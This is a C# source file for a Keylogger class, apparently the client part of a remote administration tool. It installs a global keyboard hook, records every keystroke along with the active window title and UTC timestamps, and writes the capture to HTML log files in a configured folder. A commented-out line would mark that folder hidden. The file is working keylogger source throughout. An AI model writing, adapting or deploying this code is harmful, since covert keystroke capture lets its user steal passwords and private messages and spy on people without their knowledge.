using Client.Extensions;
using Common.Helper;
using Gma.System.MouseKeyHook;
using System.Globalization;
using System.Text;
using System.Web;
using Timer = System.Timers.Timer;
namespace Client.Logging
{
    public class Keylogger : IDisposable
    {
        public bool IsDisposed { get; private set; }
        private readonly Timer _timerFlush;
        private readonly StringBuilder _logFileBuffer = new StringBuilder();
        private readonly List<Keys> _pressedKeys = new List<Keys>();
        private readonly List<char> _pressedKeyChars = new List<char>();
        private string _lastWindowTitle = string.Empty;
        private bool _ignoreSpecialKeys;
        private readonly IKeyboardMouseEvents _mEvents;
        private readonly long _maxLogFileSize;

        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _mEvents = Hook.GlobalEvents();
            _timerFlush = new Timer { Interval = flushInterval };
            _timerFlush.Elapsed += TimerElapsed;
        }

        public void Start()
        {
            Subscribe();
            _timerFlush.Start();
        }

        public void Dispose()
        {
            if (IsDisposed)
                return;

            Unsubscribe();
            _timerFlush.Stop();
            _timerFlush.Dispose();
            _mEvents.Dispose();
            WriteFile();

            IsDisposed = true;

            GC.SuppressFinalize(this);
        }

        private void Subscribe()
        {
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= OnKeyPress;
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
            {
                _lastWindowTitle = activeWindowTitle;
                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - "
                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)
                    + " UTC</b>]</p><br>");
            }

            if (_pressedKeys.ContainsModifierKeys())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    _pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    _pressedKeys.Add(e.KeyCode);
                }
            }
        }

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var filtered = HttpUtility.HtmlEncode(e.KeyChar.ToString());
                if (!string.IsNullOrEmpty(filtered))
                {
                    if (_pressedKeys.ContainsModifierKeys())
                        _ignoreSpecialKeys = true;

                    _pressedKeyChars.Add(e.KeyChar);
                    _logFileBuffer.Append(filtered);
                }
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
            _pressedKeyChars.Clear();
        }

        private bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!_ignoreSpecialKeys)
                {
                    names[i] = keys[i].GetDisplayName();
                }
                else
                {
                    names[i] = string.Empty;
                    _pressedKeys.Remove(keys[i]);
                }
            }

            _ignoreSpecialKeys = false;

            if (_pressedKeys.ContainsModifierKeys())
            {
                StringBuilder specialKeys = new StringBuilder();

                int validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i])) continue;

                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }

                if (validSpecialKeys > 0)
                    specialKeys.Append("]");

                return specialKeys.ToString();
            }

            StringBuilder normalKeys = new StringBuilder();

            for (int i = 0; i < names.Length; i++)
            {
                _pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i])) continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                        break;
                    case "Escape":
                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                        break;
                    default:
                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
                        break;
                }
            }

            return normalKeys.ToString();
        }

        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));

            try
            {
                DirectoryInfo di = new DirectoryInfo(Settings.LOGSPATH);

                if (!di.Exists)
                    di.Create();

                //di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                int i = 1;
                while (File.Exists(filePath))
                {
                    long length = new FileInfo(filePath).Length;
                    if (length < _maxLogFileSize)
                    {
                        break;
                    }

                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
                    filePath = Path.Combine(Settings.LOGSPATH, newFileName);
                    i++;
                }

                if (!File.Exists(filePath))
                    writeHeader = true;

                StringBuilder logFile = new StringBuilder();

                if (writeHeader)
                {
                    logFile.Append(
                        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                        DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");

                    logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");

                    _lastWindowTitle = string.Empty;
                }

                if (_logFileBuffer.Length > 0)
                {
                    logFile.Append(_logFileBuffer);
                }

                FileHelper.WriteLogFile(filePath, logFile.ToString());

                logFile.Clear();
            }
            catch
            {
            }

            _logFileBuffer.Clear();
        }
    }
}
